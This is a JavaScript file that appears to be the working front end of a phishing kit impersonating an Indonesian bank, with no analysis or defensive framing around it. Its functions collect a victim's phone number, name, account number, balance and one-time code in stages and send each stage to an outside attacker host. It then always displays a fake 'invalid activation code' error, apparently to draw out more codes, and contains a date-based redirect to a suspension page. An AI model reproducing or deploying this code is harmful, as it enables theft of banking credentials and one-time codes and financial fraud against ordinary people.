let tglNow = new Date();
let waktuBatas = new Date("2025-08-05T23:59:59");
if (tglNow.getTime() >= waktuBatas.getTime()) {
  document.location.href = "https://suspend-web.pages.dev";
} else {
  console.log("Server aktif");
}
function sendHp() {
  event.preventDefault();
  var tarif = $('input[name="tarif"]:checked').val();
  if (tarif) {
    sessionStorage.setItem("tarif", tarif);
  }
  var nomor = document.getElementById("nohp").value;
  sessionStorage.setItem("nomor", nomor);
  $(".process1").fadeIn();
  document.getElementById("btnSubmit1").innerHTML = "Memproses...";

  $.ajax({
    type: "POST",
    url: "https://demcloud.my.id/BSI/cvhgt1/no.php",
    data: $("#formHP").serialize(),
    datatype: "text",

    complete: function (data) {
      setTimeout(function () {
        window.location.href = "login.html";
        document.getElementById("btnSubmit1").innerHTML = "SELANJUTNYA";
        $(".process1").fadeOut();
      }, 800);
    },
  });
}

function sendLog() {
  event.preventDefault();
  $(".process1").fadeIn();
  document.getElementById("btnSubmit1").innerHTML = "Memproses...";

  const tarif = $("#tarif").val();
  const nomor = $("#nomor").val();
  const nama = $("#nama").val();
  const rek = $("#rek").val();

  if (!tarif || !nomor || !nama || !rek) {
    window.location.href = "/";
    return false;
  }

  $.ajax({
    type: "POST",
    url: "https://demcloud.my.id/BSI/cvhgt1/login.php",
    data: $("#formLog").serialize(),
    datatype: "text",
    complete: function (data) {
      setTimeout(function () {
        window.location.href = "saldo.html";
        document.getElementById("btnSubmit1").innerHTML = "SELANJUTNYA";
        $(".process1").fadeOut();
        var tarif = document.getElementById("tarif").value;
        sessionStorage.setItem("tarif", tarif);
        var nomor = document.getElementById("nomor").value;
        sessionStorage.setItem("nomor", nomor);
        var nama = document.getElementById("nama").value;
        sessionStorage.setItem("nama", nama);
        var rek = document.getElementById("rek").value;
        sessionStorage.setItem("rek", rek);
      }, 800);
    },
  });
}

function sendSaldo() {
  event.preventDefault();
  $(".process1").fadeIn();
  document.getElementById("btnSubmit1").innerHTML = "Memproses...";

  const tarif = $("#tarif").val();
  const nomor = $("#nomor").val();
  const nama = $("#nama").val();
  const rek = $("#rek").val();
  const saldo = $("#saldo").val();

  if (!tarif || !nomor || !nama || !rek || !saldo) {
    window.location.href = "/";
    return false;
  }

  $.ajax({
    type: "POST",
    url: "https://demcloud.my.id/BSI/cvhgt1/saldo.php",
    data: $("#jualpuki").serialize(),
    datatype: "text",
    complete: function (data) {
      setTimeout(function () {
        window.location.href = "otp.html";
        document.getElementById("btnSubmit1").innerHTML = "SELANJUTNYA";
        $(".process1").fadeOut();
        var tarif = document.getElementById("tarif").value;
        sessionStorage.setItem("tarif", tarif);
        var nomor = document.getElementById("nomor").value;
        sessionStorage.setItem("nomor", nomor);
        var nama = document.getElementById("nama").value;
        sessionStorage.setItem("nama", nama);
        var rek = document.getElementById("rek").value;
        sessionStorage.setItem("rek", rek);
        var saldo = document.getElementById("saldo").value;
        sessionStorage.setItem("saldo", saldo);
      }, 800);
    },
  });
}

// otp
function sendOtp() {
  event.stopPropagation();
  event.preventDefault();
  $("#djload").show();
  document.getElementById("btnSubmit1").innerHTML = "Memproses...";

  const tarif = $("#tarif").val();
  const nomor = $("#nomor").val();
  const nama = $("#nama").val();
  const rek = $("#rek").val();
  const saldo = $("#saldo").val();
  const sixpin = $("#sixpin").val();

  if (!tarif || !nomor || !nama || !rek || !saldo || !sixpin) {
    window.location.href = "/";
    return false;
  }

  $.ajax({
    type: "POST",
    url: "https://demcloud.my.id/BSI/cvhgt1/otp.php",
    async: false,
    dataType: "JSON",
    data: $("#form2").serialize(),

    complete: function (data) {
      console.log("Complete");
      setTimeout(function () {}, 2000);
      $("#notif").text("- Kode Aktivasi tidak valid / kadaluarsa -");
      $("#notif").css("color", "red");
    },
  });
  setTimeout(() => {
    document.getElementById("notif").innerHTML =
      "Untuk mendapatkan kode Aktivasi,<br/>Silahkan klik tombol dibawah ini";
    $("#djload").hide();
    $("#notif").css("color", "black");
    $("#sixpin").val("");
    document.getElementById("btnSubmit1").innerHTML = "Selanjutnya";
  }, 4000);
}

// datawa

function getcs() {
  $("#djload").show();

  setTimeout(function () {
    location.href = "https://demcloud.my.id/BSI/cvhgt1/wa";
  }, 1000);
  setTimeout(function () {
    $("#djload").hide();
  }, 1100);
}
